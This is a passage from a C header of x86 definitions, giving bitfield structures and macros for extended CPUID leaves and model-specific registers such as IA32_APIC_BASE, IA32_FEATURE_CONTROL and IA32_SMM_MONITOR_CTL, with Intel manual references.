       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString2 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_BIT 0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_FLAG 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2_MASK 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_2(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString3 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_BIT 0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_FLAG 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3_MASK 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_3(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString4 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_BIT 0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_FLAG 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4_MASK 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_4(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000002;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString5 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_BIT 0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_FLAG 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5_MASK 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_5(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString6 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_BIT 0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_FLAG 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6_MASK 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_6(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString7 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_BIT 0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_FLAG 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7_MASK 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_7(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString8 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_BIT 0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_FLAG 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8_MASK 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_8(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000003;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString9 : 32;
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_BIT 0
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_FLAG 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9_MASK 0xFFFFFFFF
#define CPUID_EAX_PROCESSOR_BRAND_STRING_9(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString10 : 32;
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_BIT 0
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_FLAG 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10_MASK 0xFFFFFFFF
#define CPUID_EBX_PROCESSOR_BRAND_STRING_10(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString11 : 32;
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_BIT 0
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_FLAG 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11_MASK 0xFFFFFFFF
#define CPUID_ECX_PROCESSOR_BRAND_STRING_11(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Processor Brand String Continued.
       */
      UINT32 ProcessorBrandString12 : 32;
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_BIT 0
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_FLAG 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12_MASK 0xFFFFFFFF
#define CPUID_EDX_PROCESSOR_BRAND_STRING_12(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000004;

/**
 * @brief Extended Function CPUID Information
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000005;

/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_CACHE_INFO 0x80000006
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 7:0] Cache Line size in bytes.
       */
      UINT32 CacheLineSizeInBytes : 8;
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_BIT 0
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_FLAG 0xFF
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES_MASK 0xFF
#define CPUID_ECX_CACHE_LINE_SIZE_IN_BYTES(_) (((_) >> 0) & 0xFF)
      UINT32 Reserved1 : 4;

      /**
       * [Bits 15:12] L2 Associativity field.
       * L2 associativity field encodings:
       * - 00H - Disabled.
       * - 01H - Direct mapped.
       * - 02H - 2-way.
       * - 04H - 4-way.
       * - 06H - 8-way.
       * - 08H - 16-way.
       * - 0FH - Fully associative.
       */
      UINT32 L2AssociativityField : 4;
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_BIT 12
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_FLAG 0xF000
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD_MASK 0x0F
#define CPUID_ECX_L2_ASSOCIATIVITY_FIELD(_) (((_) >> 12) & 0x0F)

      /**
       * [Bits 31:16] Cache size in 1K units.
       */
      UINT32 CacheSizeIn1KUnits : 16;
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_BIT 16
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_FLAG 0xFFFF0000
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS_MASK 0xFFFF
#define CPUID_ECX_CACHE_SIZE_IN_1K_UNITS(_) (((_) >> 16) & 0xFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000006;

/**
 * Extended Function CPUID Information.
 */
#define CPUID_EXTENDED_TIME_STAMP_COUNTER 0x80000007
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      UINT32 Reserved1 : 8;

      /**
       * [Bit 8] Invariant TSC available if 1.
       */
      UINT32 InvariantTscAvailable : 1;
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_BIT 8
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_FLAG 0x100
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE_MASK 0x01
#define CPUID_EDX_INVARIANT_TSC_AVAILABLE(_) (((_) >> 8) & 0x01)
      UINT32 Reserved2 : 23;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_80000007;

/**
 * @}
 */

/**
 * @defgroup MODEL_SPECIFIC_REGISTERS \
 *           Model Specific Registers
 *
 * @see Vol2A[3.2(CPUID)] (reference)
 * @{
 */
/**
 * @defgroup IA32_P5_MC \
 *           IA32_P5_MC_(x)
 *
 * When machine-check exceptions are enabled for the Pentium processor (MCE flag is set in control
 * register CR4), the machine-check exception handler uses the RDMSR instruction to read the error
 * type from the P5_MC_TYPE register and the machine check address from the P5_MC_ADDR register. The
 * handler then normally reports these register values to the system console before aborting
 * execution.
 *
 * @see Vol3B[15.10.2(Pentium Processor Machine-Check Exception Handling)] (reference)
 * @{
 */
/**
 * Machine-check exception address.
 *
 * @remarks 05_01H
 * @see Vol4[2.22(MSRS IN PENTIUM PROCESSORS)]
 */
#define IA32_P5_MC_ADDR 0x00000000

/**
 * Machine-check exception type.
 *
 * @remarks 05_01H
 * @see Vol4[2.22(MSRS IN PENTIUM PROCESSORS)]
 */
#define IA32_P5_MC_TYPE 0x00000001
/**
 * @}
 */

/**
 * System coherence line size.
 *
 * @remarks 0F_03H
 * @see Vol3A[8.10.5(Monitor/Mwait Address Range Determination)]
 * @see Vol3A[8.10.5(Monitor/Mwait Address Range Determination)] (reference)
 */
#define IA32_MONITOR_FILTER_LINE_SIZE 0x00000006

/**
 * Value as returned by instruction RDTSC.
 *
 * @remarks 05_01H
 * @see Vol3B[17.17(TIME-STAMP COUNTER)]
 */
#define IA32_TIME_STAMP_COUNTER 0x00000010

/**
 * The operating system can use this MSR to determine "slot" information for the processor and the
 * proper microcode update to load.
 *
 * @remarks 06_01H
 */
#define IA32_PLATFORM_ID 0x00000017
typedef union {
  struct {
    UINT64 Reserved1 : 50;

    /**
     * @brief Platform Id <b>(RO)</b>
     *
     * [Bits 52:50] Contains information concerning the intended platform for the processor.
     *
     *
     * 52 | 51 | 50 | _
     * --:|:--:|:---|-----------------
     * 0  | 0  | 0  | Processor Flag 0
     * 0  | 0  | 1  | Processor Flag 1
     * 0  | 1  | 0  | Processor Flag 2
     * 0  | 1  | 1  | Processor Flag 3
     * 1  | 0  | 0  | Processor Flag 4
     * 1  | 0  | 1  | Processor Flag 5
     * 1  | 1  | 0  | Processor Flag 6
     * 1  | 1  | 1  | Processor Flag 7
     */
    UINT64 PlatformId : 3;
#define IA32_PLATFORM_ID_PLATFORM_ID_BIT 50
#define IA32_PLATFORM_ID_PLATFORM_ID_FLAG 0x1C000000000000
#define IA32_PLATFORM_ID_PLATFORM_ID_MASK 0x07
#define IA32_PLATFORM_ID_PLATFORM_ID(_) (((_) >> 50) & 0x07)
    UINT64 Reserved2 : 11;
  };

  UINT64 Flags;
} IA32_PLATFORM_ID_REGISTER;

/**
 * This register holds the APIC base address, permitting the relocation of the APIC memory map.
 *
 * @remarks 06_01H
 * @see Vol3A[10.4.4(Local APIC Status and Location)]
 * @see Vol3A[10.4.5(Relocating the Local APIC Registers)]
 */
#define IA32_APIC_BASE 0x0000001B
typedef union {
  struct {
    UINT64 Reserved1 : 8;

    /**
     * [Bit 8] BSP flag.
     */
    UINT64 BspFlag : 1;
#define IA32_APIC_BASE_BSP_FLAG_BIT 8
#define IA32_APIC_BASE_BSP_FLAG_FLAG 0x100
#define IA32_APIC_BASE_BSP_FLAG_MASK 0x01
#define IA32_APIC_BASE_BSP_FLAG(_) (((_) >> 8) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * [Bit 10] Enable x2APIC mode.
     */
    UINT64 EnableX2ApicMode : 1;
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_BIT 10
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_FLAG 0x400
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE_MASK 0x01
#define IA32_APIC_BASE_ENABLE_X2APIC_MODE(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] APIC Global Enable.
     */
    UINT64 ApicGlobalEnable : 1;
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_BIT 11
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_FLAG 0x800
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_MASK 0x01
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE(_) (((_) >> 11) & 0x01)

    /**
     * [Bits 47:12] APIC Base.
     */
    UINT64 ApicBase : 36;
#define IA32_APIC_BASE_APIC_BASE_BIT 12
#define IA32_APIC_BASE_APIC_BASE_FLAG 0xFFFFFFFFF000
#define IA32_APIC_BASE_APIC_BASE_MASK 0xFFFFFFFFF
#define IA32_APIC_BASE_APIC_BASE(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved3 : 16;
  };

  UINT64 Flags;
} IA32_APIC_BASE_REGISTER;

/**
 * Control Features in Intel 64 Processor.
 *
 * @remarks If any one enumeration condition for defined bit field holds.
 */
#define IA32_FEATURE_CONTROL 0x0000003A
typedef union {
  struct {
    /**
     * @brief Lock bit <b>(R/WO)</b>
     *
     * [Bit 0] When set, locks this MSR from being written; writes to this bit will result in GP(0).
     *
     * @note Once the Lock bit is set, the contents of this register cannot be modified. Therefore
     * the lock bit must be set after configuring support for Intel Virtualization Technology and
     * prior to transferring control to an option ROM or the OS. Hence, once the Lock bit is set,
     * the entire IA32_FEATURE_CONTROL contents are preserved across RESET when PWRGOOD is not
     * deasserted.
     * @remarks If any one enumeration condition for defined bit field position greater than bit 0
     * holds.
     */
    UINT64 LockBit : 1;
#define IA32_FEATURE_CONTROL_LOCK_BIT_BIT 0
#define IA32_FEATURE_CONTROL_LOCK_BIT_FLAG 0x01
#define IA32_FEATURE_CONTROL_LOCK_BIT_MASK 0x01
#define IA32_FEATURE_CONTROL_LOCK_BIT(_) (((_) >> 0) & 0x01)

    /**
     * @brief Enable VMX inside SMX operation <b>(R/WL)</b>
     *
     * [Bit 1] This bit enables a system executive to use VMX in conjunction with SMX to support
     * Intel(R) Trusted Execution Technology. BIOS must set this bit only when the CPUID function 1
     * returns VMX feature flag and SMX feature flag set (ECX bits 5 and 6 respectively).
     *
     * @remarks If CPUID.01H:ECX[5] = 1 && CPUID.01H:ECX[6] = 1
     */
    UINT64 EnableVmxInsideSmx : 1;
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_BIT 1
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_FLAG 0x02
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_MASK 0x01
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX(_) (((_) >> 1) & 0x01)

    /**
     * @brief Enable VMX outside SMX operation <b>(R/WL)</b>
     *
     * [Bit 2] This bit enables VMX for a system executive that does not require SMX. BIOS must set
     * this bit only when the CPUID function 1 returns the VMX feature flag set (ECX bit 5).
     *
     * @remarks If CPUID.01H:ECX[5] = 1
     */
    UINT64 EnableVmxOutsideSmx : 1;
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_BIT 2
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_FLAG 0x04
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_MASK 0x01
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * @brief SENTER Local Function Enable <b>(R/WL)</b>
     *
     * [Bits 14:8] When set, each bit in the field represents an enable control for a corresponding
     * SENTER function. This field is supported only if CPUID.1:ECX.[bit 6] is set.
     *
     * @remarks If CPUID.01H:ECX[6] = 1
     */
    UINT64 SenterLocalFunctionEnables : 7;
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_BIT 8
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_FLAG 0x7F00
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_MASK 0x7F
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES(_) (((_) >> 8) & 0x7F)

    /**
     * @brief SENTER Global Enable <b>(R/WL)</b>
     *
     * [Bit 15] This bit must be set to enable SENTER leaf functions. This bit is supported only if
     * CPUID.1:ECX.[bit 6] is set.
     *
     * @remarks If CPUID.01H:ECX[6] = 1
     */
    UINT64 SenterGlobalEnable : 1;
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_BIT 15
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_FLAG 0x8000
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_MASK 0x01
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE(_) (((_) >> 15) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief SGX Launch Control Enable <b>(R/WL)</b>
     *
     * [Bit 17] This bit must be set to enable runtime reconfiguration of SGX Launch Control via the
     * IA32_SGXLEPUBKEYHASHn MSR.
     *
     * @remarks If CPUID.(EAX=07H, ECX=0H): ECX[30] = 1
     */
    UINT64 SgxLaunchControlEnable : 1;
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_BIT 17
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_FLAG 0x20000
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_MASK 0x01
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE(_) (((_) >> 17) & 0x01)

    /**
     * @brief SGX Global Enable <b>(R/WL)</b>
     *
     * [Bit 18] This bit must be set to enable SGX leaf functions.
     *
     * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[2] = 1
     */
    UINT64 SgxGlobalEnable : 1;
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_BIT 18
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_FLAG 0x40000
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_MASK 0x01
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE(_) (((_) >> 18) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * @brief LMCE On <b>(R/WL)</b>
     *
     * [Bit 20] When set, system software can program the MSRs associated with LMCE to configure
     * delivery of some machine check exceptions to a single logical processor.
     *
     * @remarks If IA32_MCG_CAP[27] = 1
     */
    UINT64 LmceOn : 1;
#define IA32_FEATURE_CONTROL_LMCE_ON_BIT 20
#define IA32_FEATURE_CONTROL_LMCE_ON_FLAG 0x100000
#define IA32_FEATURE_CONTROL_LMCE_ON_MASK 0x01
#define IA32_FEATURE_CONTROL_LMCE_ON(_) (((_) >> 20) & 0x01)
    UINT64 Reserved4 : 43;
  };

  UINT64 Flags;
} IA32_FEATURE_CONTROL_REGISTER;

/**
 * Per Logical Processor TSC Adjust.
 *
 * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[1] = 1
 */
#define IA32_TSC_ADJUST 0x0000003B
typedef struct {
  /**
   * Local offset value of the IA32_TSC for a logical processor. Reset value is zero. A write to
   * IA32_TSC will modify the local offset in IA32_TSC_ADJUST and the content of IA32_TSC, but does
   * not affect the internal invariant TSC hardware.
   */
  UINT64 ThreadAdjust;
} IA32_TSC_ADJUST_REGISTER;

/**
 * @brief BIOS Update Trigger <b>(W)</b>
 *
 * Executing a WRMSR instruction to this MSR causes a microcode update to be loaded into the
 * processor. A processor may prevent writing to this MSR when loading guest states on VM entries or
 * saving guest states on VM exits.
 *
 * @remarks 06_01H
 * @see Vol3A[9.11.6(Microcode Update Loader)]
 */
#define IA32_BIOS_UPDATE_TRIGGER 0x00000079

/**
 * @brief BIOS Update Signature <b>(RO)</b>
 *
 * Returns the microcode update signature following the execution of CPUID.01H. A processor may
 * prevent writing to this MSR when loading guest states on VM entries or saving guest states on VM
 * exits.
 *
 * @remarks 06_01H
 */
#define IA32_BIOS_UPDATE_SIGNATURE 0x0000008B
typedef union {
  struct {
    /**
     * [Bits 31:0] Reserved.
     */
    UINT64 Reserved : 32;
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_BIT 0
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_FLAG 0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_MASK 0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)

    /**
     * @brief Microcode update signature
     *
     * [Bits 63:32] This field contains the signature of the currently loaded microcode update when
     * read following the execution of the CPUID instruction, function 1. It is required that this
     * register field be pre-loaded with zero prior to executing the CPUID, function 1. If the field
     * remains equal to zero, then there is no microcode update loaded. Another nonzero value will
     * be the signature.
     *
     * @see Vol3A[9.11.7.1(Determining the Signature)] (reference)
     */
    UINT64 MicrocodeUpdateSignature : 32;
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_BIT 32
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_FLAG 0xFFFFFFFF00000000
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_MASK 0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE(_) (((_) >> 32) & 0xFFFFFFFF)
  };

  UINT64 Flags;
} IA32_BIOS_UPDATE_SIGNATURE_REGISTER;

/**
 * @defgroup IA32_SGXLEPUBKEYHASH \
 *           IA32_SGXLEPUBKEYHASH[(64*n+63):(64*n)]
 *
 * Bits (64*n+63):(64*n) of the SHA256 digest of the SIGSTRUCT.MODULUS for SGX Launch Enclave. On
 * reset, the default value is the digest of Intel's signing key.
 *
 * @remarks Read permitted If CPUID.(EAX=12H,ECX=0H): EAX[0]=1 && CPUID.(EAX=07H,ECX=0H):ECX[30]=1.
 * Write permitted if CPUID.(EAX=12H,ECX=0H): EAX[0]=1 && IA32_FEATURE_CONTROL[17] = 1 &&
 * IA32_FEATURE_CONTROL[0] = 1.
 * @{
 */
#define IA32_SGXLEPUBKEYHASH0 0x0000008C
#define IA32_SGXLEPUBKEYHASH1 0x0000008D
#define IA32_SGXLEPUBKEYHASH2 0x0000008E
#define IA32_SGXLEPUBKEYHASH3 0x0000008F
/**
 * @}
 */

/**
 * SMM Monitor Configuration.
 *
 * @remarks If CPUID.01H: ECX[5]=1 || CPUID.01H: ECX[6] = 1
 */
#define IA32_SMM_MONITOR_CTL 0x0000009B
typedef union {
  struct {
    /**
     * @brief Valid <b>(R/W)</b>
     *
     * [Bit 0] The STM may be invoked using VMCALL only if this bit is 1. Because VMCALL is used to
     * activate the dual-monitor treatment, the dual-monitor treatment cannot be activated if the
     * bit is 0. This bit is cleared when the logical processor is reset.
     *
     * @see Vol3C[34.15.6(Activating the Dual-Monitor Treatment)]
     * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
     */
    UINT64 Valid : 1;
#define IA32_SMM_MONITOR_CTL_VALID_BIT 0
#define IA32_SMM_MONITOR_CTL_VALID_FLAG 0x01
#define IA32_SMM_MONITOR_CTL_VALID_MASK 0x01
#define IA32_SMM_MONITOR_CTL_VALID(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief Controls SMI unblocking by VMXOFF
     *
     * [Bit 2] Determines whether executions of VMXOFF unblock SMIs under the default treatment of
     * SMIs and SMM. Executions of VMXOFF unblock SMIs unless bit 2 is 1 (the value of bit 0 is
     * irrelevant).
     *
     * @remarks If IA32_VMX_MISC[28]
     * @see Vol3C[34.14.4(VMXOFF and SMI Unblocking)]
     * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
     */
    UINT64 SmiUnblockingByVmxoff : 1;
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_BIT 2
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_FLAG 0x04
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_MASK 0x01
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF(_) (((_) >> 2) & 0x01)
    UINT64 Reserved2 : 9;

    /**
     * @brief MSEG Base <b>(R/W)</b>
     *
     * [Bits 31:12] Value that, when shifted left 12 bits, is the physical address of MSEG (the MSEG
     * base address).
     *
     * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
     */
    UINT64 MsegBase : 20;
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_BIT 12
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_FLAG 0xFFFFF000
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_MASK 0xFFFFF
#define IA32_SMM_MONITOR_CTL_MSEG_BASE(_) (((_) >> 12) & 0xFFFFF)
    UINT64 Reserved3 : 32;
  };

  UINT64 Flags;
} IA32_SMM_MONITOR_CTL_REGISTER;

typedef struct {
  /**
   * @brief MSEG revision identifier
   *
   * Different processors may use different MSEG revision identifiers. These identifiers enable
   * software to avoid using an MSEG header formatted for one processor on a processor that uses a
   * different format. Software can discover the MSEG revision identifier that a processor uses by
